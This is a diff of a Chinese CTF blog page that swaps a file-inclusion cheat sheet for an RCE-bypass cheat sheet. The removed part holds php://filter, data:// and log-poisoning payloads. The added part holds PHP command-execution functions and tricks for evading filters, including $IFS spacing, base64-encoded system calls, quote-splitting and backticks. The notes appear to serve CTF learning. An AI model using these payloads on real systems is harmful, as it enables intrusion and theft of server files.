@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="color-scheme" content="light dark">
   
-  <title>你也喜欢小狸猫吗</title>
+  <title>RCE思路总结 - 你也喜欢小狸猫吗</title>
   
     <link rel="shortcut icon" href="/favicon.png">
   
@@ -16,15 +16,15 @@
   
   
   
-  <meta property="og:title" content="你也喜欢小狸猫吗" />
+  <meta property="og:title" content="RCE思路总结 - 你也喜欢小狸猫吗" />
   
   <meta property="og:type" content="article" />
   
-  <meta property="og:url" content="http://example.com/2023/10/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/index.html" />
+  <meta property="og:url" content="http://example.com/2023/10/21/ctf/RCE%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/index.html" />
   
   <meta property="og:image" content="/favicon.png" />
   
-  <meta property="og:article:published_time" content="2023-10-16T11:47:52.462Z" />
+  <meta property="og:article:published_time" content="2023-10-21T14:29:59.000Z" />
   
   <meta property="og:article:author" content="za0y0u" />
   
@@ -155,43 +155,36 @@
         
         <div class="date" id="date">
             <span>October</span>
-            <span>16,</span>
+            <span>21,</span>
             <span>2023</span>
         </div>
         
 
-        <h2 class="title"></h2>
+        <h2 class="title">RCE思路总结</h2>
     </div>
 
     <div class="divider"></div>
 
     <div class="content">
-        <h1 id="文件包含思路总结"><a href="#文件包含思路总结" class="headerlink" title="文件包含思路总结"></a>文件包含思路总结</h1><p>[TOC]</p>
-<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h5><p>可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+?file=php://filter/resource=xxx.php</span><br></pre></td></tr></table></figure>
+        <h1 id="RCE思路总结"><a href="#RCE思路总结" class="headerlink" title="RCE思路总结"></a>RCE思路总结</h1><h4 id="常见的命令"><a href="#常见的命令" class="headerlink" title="常见的命令"></a>常见的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rce 题目，常用的几个系统命令执行函数</span><br><span class="line">system()    ls/查看根目录列表  cat tac</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
 
-<p>直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取下面方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">过滤器</span><br><span class="line">base：?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">convert：php://filter//convert.iconv.SJIS*.UCS-4*/resource=</span><br><span class="line"></span><br><span class="line">rot：php://filter/read=string.rot13/resource=</span><br></pre></td></tr></table></figure>
+<h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</span><br></pre></td></tr></table></figure>
 
-<h5 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h5><p>(1) 命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=`cat flag*`;?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line">tailf 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br></pre></td></tr></table></figure>
 
-<p>data命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php system(‘命令’);?&gt; </span><br></pre></td></tr></table></figure>
+<h4 id="flag等关键字被过滤的代替方法"><a href="#flag等关键字被过滤的代替方法" class="headerlink" title="flag等关键字被过滤的代替方法"></a>flag等关键字被过滤的代替方法</h4><h6 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>这样就能执行命令 </p>
-<p>(2)大小写绕过</p>
-<pre><code>1. ?file=data:text/plain,&lt;?pHp system(&#39;ls&#39;);?&gt; 
-2. ?file=data://text/plain,&lt;?=`cat flag*`;?&gt;
-</code></pre>
-<p>(3)  data伪协议 base64:?</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
+<h6 id="base编码绕过"><a href="#base编码绕过" class="headerlink" title="base编码绕过"></a>base编码绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a = base64_decode(&#x27;c3lzdGVt&#x27;);$b=base64_decode(&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;);$a($b);</span><br></pre></td></tr></table></figure>
 
+<h6 id="单引号或者双引号来绕过"><a href="#单引号或者双引号来绕过" class="headerlink" title="单引号或者双引号来绕过"></a>单引号或者双引号来绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tips：</span><br><span class="line">具体使用单引号还是双引号还是要看外层使用的是单引号还是双引号</span><br><span class="line">?c=passthru(&quot;ca&#x27;&#x27;t config.php&quot;);</span><br></pre></td></tr></table></figure>
 
+<h6 id="全部显示绕过"><a href="#全部显示绕过" class="headerlink" title="全部显示绕过"></a>全部显示绕过</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">``:反引号，先执行</span><br><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
 
-<h5 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET: ?file=/var/log/nginx/access.log </span><br><span class="line">User-Agent: &lt;?php system(&#x27;ls&#x27;);?&gt; </span><br><span class="line">然后再换</span><br><span class="line">&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt; </span><br></pre></td></tr></table></figure>
+<h4 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;绕过</span><br></pre></td></tr></table></figure>
 
-<h5 id="不带点路径的文件，选择session会话文件"><a href="#不带点路径的文件，选择session会话文件" class="headerlink" title="不带点路径的文件，选择session会话文件"></a>不带点路径的文件，选择session会话文件</h5>
+<h4 id="括号过滤"><a href="#括号过滤" class="headerlink" title="括号过滤"></a>括号过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get  /?c=echo `$_POST[x]`;</span><br><span class="line">post x=cat flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h3>
     </div>
 
     
@@ -205,22 +198,13 @@
     
 
     <div class="container post-prev-next">
+        <a class="next"></a>
         
-        <a href="/2023/10/21/xss%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" class="next">
-            <div>
-                <div class="text">
-                    <p class="label">Next</p>
-                    <h3 class="title"></h3>
-                </div>
-            </div>
-        </a>
-        
-        
-        <a href="/2023/10/16/RSA%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" class="prev">
+        <a href="/2023/10/21/ctf/xss%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" class="prev">
             <div>
                 <div class="text">
                     <p class="label">Previous</p>
-                    <h3 class="title"></>
+                    <h3 class="title">xss思路总结</>
                 </div>
             </div>
         </a>
